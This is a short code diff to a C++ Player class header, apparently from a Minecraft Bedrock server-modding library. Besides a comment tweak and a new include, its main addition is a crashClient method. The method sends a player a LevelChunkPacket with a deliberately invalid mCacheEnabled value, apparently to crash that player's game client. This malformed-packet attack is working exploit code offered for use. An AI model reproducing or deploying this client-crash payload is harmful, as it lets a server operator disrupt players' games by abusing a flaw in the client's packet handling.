@@ -16,6 +16,7 @@
 #include "../Command/CommandPermissionLevel.h"
 #include "../Level/GameType.h"
 #include "../Level/Abilities.h"
+#include "../Packet/LevelChunkPacket.h"
 #include "../dll.h"
 
 class Packet;
@@ -322,7 +323,7 @@ public:
 		return CallServerClassMethod<bool>("?add@Player@@UEAA_NAEAVItemStack@@@Z", this, &item);
 	}
 
-	//a more reliable way to get pos delta for players
+	// a more reliable way to get pos delta for players
 	inline Vec3 getPosDelta(void) {
 		Vec3 posDelta;
 		const auto& prevPos = this->getPosOld();
@@ -331,6 +332,12 @@ public:
 		posDelta.y = currPos.y - prevPos.y;
 		posDelta.z = currPos.z - prevPos.z;
 		return posDelta;
+	}
+
+	inline void crashClient(void) {
+		LevelChunkPacket badPkt;
+		badPkt.mCacheEnabled = -0x1;
+		this->sendNetworkPacket(badPkt);
 	}
 
 	// some fields still missing
